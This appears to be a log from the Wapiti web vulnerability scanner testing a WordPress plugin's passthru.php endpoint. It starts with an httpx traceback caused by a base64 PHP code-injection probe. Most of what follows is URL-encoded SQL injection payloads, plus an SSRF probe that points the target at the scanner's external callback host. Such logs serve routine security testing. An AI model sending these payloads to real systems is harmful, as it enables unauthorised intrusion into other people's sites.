+          └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x72a80aa04400>
+    │                     │   └ ParseResult(scheme='data', userinfo='', host='', port=None, path=';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', quer...
+    │                     └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'data', 'authority': '', 'path': ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', 'query': None, 'fragment'...
+           └ <function urlparse at 0x72a80aa04220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg=='
+    └ <function validate_path at 0x72a80aa04a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-21 13:45:12.426 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-21 13:45:12.502 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report 3d8d17a8-e789-11ee-91fc-0242ac160004 ... SUCCESS
+2024-03-21 13:45:12.505 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-21 13:45:12.518 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:12.542 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-21 13:45:12.557 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:12.572 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-21 13:45:12.648 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-21 13:45:12.658 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:12.678 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-21 13:45:12.688 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:12.688 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F8gjjjj%2F1%2F737263%2F (0)
+2024-03-21 13:45:12.712 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=8gjjjj for results, please wait...
+2024-03-21 13:45:14.794 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-21 13:45:14.811 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:14.811 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%C2%BF%27%22%28 (0)
+2024-03-21 13:45:14.832 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%20AND%2032%3D67%20AND%2063%3D63 (0)
+2024-03-21 13:45:14.842 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%20AND%2035%3D80%20AND%2038%3D38 (0)
+2024-03-21 13:45:14.852 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%20AND%2063%3D63%20AND%2086%3D86 (0)
+2024-03-21 13:45:14.863 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%27%20AND%2046%3D105%20AND%20%2780%27%3D%2780 (0)
+2024-03-21 13:45:14.872 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%27%20AND%2011%3D38%20AND%20%2742%27%3D%2742 (0)
+2024-03-21 13:45:14.882 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%27%20AND%2074%3D74%20AND%20%2789%27%3D%2789 (0)
+2024-03-21 13:45:14.892 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%22%20AND%2077%3D175%20AND%20%2279%22%3D%2279 (0)
+2024-03-21 13:45:14.903 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%22%20AND%2042%3D108%20AND%20%2214%22%3D%2214 (0)
+2024-03-21 13:45:14.913 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%22%20AND%2064%3D64%20AND%20%2266%22%3D%2266 (0)
+2024-03-21 13:45:14.923 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%29%20AND%2072%3D136%20AND%20%2839%3D39 (0)
+2024-03-21 13:45:14.933 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%29%20AND%2063%3D142%20AND%20%2820%3D20 (0)
+2024-03-21 13:45:14.943 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%29%20AND%2069%3D69%20AND%20%2839%3D39 (0)
+2024-03-21 13:45:14.953 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%27%29%20AND%2074%3D130%20AND%20%28%2787%27%3D%2787 (0)
+2024-03-21 13:45:14.963 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%27%29%20AND%2083%3D127%20AND%20%28%2780%27%3D%2780 (0)
+2024-03-21 13:45:14.973 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%27%29%20AND%2010%3D10%20AND%20%28%2774%27%3D%2774 (0)
+2024-03-21 13:45:14.984 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%22%29%20AND%2056%3D131%20AND%20%28%2223%22%3D%2223 (0)
+2024-03-21 13:45:14.994 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%22%29%20AND%2047%3D126%20AND%20%28%2269%22%3D%2269 (0)
+2024-03-21 13:45:15.004 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%22%29%20AND%2095%3D95%20AND%20%28%2248%22%3D%2248 (0)
+2024-03-21 13:45:15.042 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-21 13:45:15.113 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-21 13:45:15.135 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//webp-converter-for-media.json/
+2024-03-21 13:45:15.135 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//webp-converter-for-media.json/web_03212024_1345.html with a browser to see this report.
